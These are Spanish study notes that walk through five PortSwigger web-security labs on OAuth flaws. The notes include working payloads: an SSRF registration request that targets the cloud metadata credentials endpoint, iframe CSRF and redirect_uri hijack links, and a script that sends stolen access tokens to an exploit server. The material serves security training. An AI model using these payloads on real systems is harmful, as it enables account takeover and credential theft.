-----
### QUE ES?
**OAuth Authentication** es un mecanismo de autenticación que permite a una aplicación **iniciar sesión usando una cuenta de otro servicio** (por ejemplo Google, GitHub o Facebook) sin compartir directamente la contraseña.
Funciona mediante **tokens de acceso**. El usuario se autentica en el proveedor de identidad (OAuth provider) y este devuelve a la aplicación un **token o código de autorización** que confirma la identidad del usuario.
El flujo se basa en **redirecciones entre el navegador, la aplicación y el proveedor OAuth**. Si la implementación es incorrecta, pueden aparecer vulnerabilidades como **account takeover, redirect_uri manipulation, state parameter attacks o token leakage**.
Se previene **validando correctamente `redirect_uri`, usando el parámetro `state`, comprobando los tokens y limitando los dominios permitidos**.
#### PASOS:
- **INTERCEPTAR REDIRECCIÓN:** capturar con **Burp Suite** la redirección al proveedor OAuth.
- **IDENTIFICAR PARÁMETROS IMPORTANTES:** `client_id`, `redirect_uri`, `response_type`, `scope`, `state`
- **MODIFICAR PARÁMETROS:** probar cambiar `redirect_uri`, eliminar o modificar `state`, manipular `scope`    
- **CAPTURAR EL `authorization code`:** tras autenticarse, el proveedor redirige al usuario con un código.
- **INTERCAMBIAR POR TOKEN:** la aplicación usa ese código para solicitar un **access token** al proveedor OAuth.
- **MODIFICAR VALORES INTERCAMBIADOS:** probar a manipular la informacion intercambiada entre servidor y oauth.
- **COMPROBAR REDIRECTS:** probar a cambiar los dominios de *redirect_uri*, probar *path traversal* ...
### LAB1: AUTHENTICATION BYPASS VIA OAUTH IMPLICIT FLOW
En este lab nos encontramos con una autenticación mediante *oAuth*. Si seguimos todo el flujo de peticiones intercambiadas, encontramos una request que se envia con la *informacion del usuario*, correo, nombre y token. Podemos probar a modificar los datos con los de otro usuario para loguearnos.
### LAB2: SSRF VIA OPENID DYNAMIC CLIENT REGISTRATION
En este lab mientras interceptamos el tráfico con **Burp** e iniciamos sesión vemos una request que usa en `Host:` el dominio del servidor oAuth podemos acceder al endpoint de configuración en `dominnio/.well-known/openid-configuration`, donde vemos que el registro dinámico de clientes está en `/reg`. Desde **Burp Repeater** enviamos una petición `POST /reg` con un JSON que contenga al menos `redirect_uris` para registrar una aplicación cliente falsa sin autenticación, lo que devuelve un `client_id`. Durante el flujo OAuth observamos que la página de autorización carga el logo de la aplicación desde `/client/CLIENT-ID/logo`, y según la especificación OpenID se puede definir mediante el parámetro `logo_uri` en el registro del cliente. Entonces modificamos la petición de registro añadiendo `logo_uri` con un **payload de Burp Collaborator** para comprobar que el servidor OAuth realiza una petición externa al intentar cargar el logo. Una vez confirmado el SSRF, registramos otra aplicación estableciendo `logo_uri` a `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/`, obtenemos el nuevo `client_id` y solicitamos `/client/CLIENT-ID/logo`, lo que provoca que el servidor acceda al **metadata service del entorno cloud** y devuelva información sensible, incluyendo la **secret access key**, que se utiliza para resolver el laboratorio.
`POST /reg HTTP/1.1
`Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
`Content-Type: application/json
`                              `
`{
`    "redirect_uris" : [
`        "https://example.com"
`    ],
`    "logo_uri" : http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
`}
### LAB3: FORCED OAUTH PROFILE LINKING
En este laboratorio encontramos que podemos añadir el logueo a traves de una red social. Si seguimos todo el flujo de datos observamos una request `/auth?client_id`que redirige q `/oauth-linking` que es la que se usa para enlazar las cuentas, el problema es que no usa ningun tipo de codigo anti *CSRF*. Por lo tanto podemos interceptar todo el flujo de enlace de cuenta y cuando lleguemos a la request `/oauth-linking`  podesmos copiarla como *url* y dropearla, de manera que en el *exploit server* a traves de un iframe se la enviamos a la victima para que sin darse cuenta cuando pinche se enlace su cuenta de administrador con nuestra cuenta.
`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>`
### LAB4: OAUTH ACCOUNT HIJACKING VIA REDIRECT_URI
En este laboratorio tenemos un inicio de sesion a traves de una red social. Si seguimos todo el flujo a traves de *burpsuite* vemos una request `/auth?client_id`que usa un parametro *redirect_uri* el cual no esta sanitizado y te permite poner lo que quieras. Si le metemos nuestro dominio del *exploit server* y la enviamos siguiendo el redirect comprobamos que en los logs del *exploit server* se queda almacenado nuestro codigo de sesión. Podemos tratar de crear un iframe como este `<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>` y enviarselo a la victima de forma que cuando pinche en el se quede su codigo de sesión almacenado en los logs. Una vez obtenido el código solo tenemos que buscar `https://LAB-ID.web-security-academy.net/oauth-callback?code=CODIGO-ROBADO` y iniciamos sesión como el otro usuario.
### LAB5: STEALING OAUTH ACCESS TOKENS VIA AN OPEN REDIRECT
Mientras se **proxyficaba el tráfico con Burp**, se hace clic en **“My account”** y se completa el proceso de login mediante **OAuth**. Después de autenticarse, el usuario es redirigido de nuevo al sitio del blog. Al analizar las **peticiones y respuestas**, se observa que la web del blog realiza una **llamada a la API al endpoint `/me`**, desde donde obtiene la información del usuario para iniciar sesión. Esta petición **`GET /me`** se envía a **Burp Repeater** para analizarla.
Después se **cierra sesión y se vuelve a iniciar**, y en el historial del proxy se localiza la petición más reciente **`GET /auth?client_id=[...]`**, que también se envía a **Repeater**. Al experimentar con esta petición se observa que **no se puede usar un dominio externo en `redirect_uri`** porque está validado contra una **whitelist**, pero sí se pueden **añadir caracteres adicionales al valor por defecto**, incluyendo la secuencia de **path traversal `/../`**.
Se vuelve a **cerrar sesión** en el blog y se **activa la interceptación en Burp**. Al iniciar sesión de nuevo, se intercepta la petición **`GET /auth?client_id=[...]`**. Se comprueba que el parámetro **`redirect_uri` es vulnerable a directory traversal**modificándolo a:
`https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1
Tras reenviar las peticiones, el usuario acaba siendo **redirigido al primer post del blog**. En la URL se observa que el **access token aparece en el fragmento (`#`)**.
Auditando otras páginas del blog se encuentra la opción **“Next post”**, que redirige a la ruta indicada en el parámetro **`path`**mediante la petición **`GET /post/next?path=[...]`**. Al probar este parámetro se descubre que es un **Open Redirect**, ya que acepta incluso **URLs absolutas** que redirigen a **otros dominios**, por ejemplo al **exploit server**.
Con esto se construye una **URL maliciosa** que combina ambas vulnerabilidades. Esta URL inicia el flujo OAuth con un **`redirect_uri` que apunta al open redirect**, que posteriormente envía a la víctima al exploit server:
`https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email
Al abrir esta URL en el navegador, el usuario termina en la página **“Hello, world!” del exploit server**, con el **access token incluido en el fragmento de la URL**.
En el **exploit server**, se crea un script en `/exploit` que **extrae el fragmento de la URL y lo envía al log**, por ejemplo redirigiendo de nuevo con el token como parámetro:
`<script>  
`window.location = '/?'+document.location.hash.substr(1)  
`</script>
Al probarlo visitando la URL maliciosa, en el **access log del exploit server** aparece una petición del tipo:
`GET /?access_token=[...]
Después se crea el **exploit final**, que primero fuerza a la víctima a iniciar el flujo OAuth y luego ejecuta el script para robar el token:
`<script>  
`if (!document.location.hash) {  
`    window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'  
`} else {  
`    window.location = '/?'+document.location.hash.substr(1)  
`}  
`</script>
Al probar el exploit, la página parece refrescarse, pero en el **access log** aparece una nueva petición con **`access_token`**. Se envía el exploit a la víctima y se copia su token del log.
Finalmente, en **Burp Repeater**, se vuelve a la petición **`GET /me`** y se sustituye el valor del header:
Authorization: Bearer <token>
por el **access token robado** . Al enviar la petición se obtienen los **datos de la víctima**, incluyendo su **API key**. Esa clave se introduce en **“Submit solution”** para completar el laboratorio.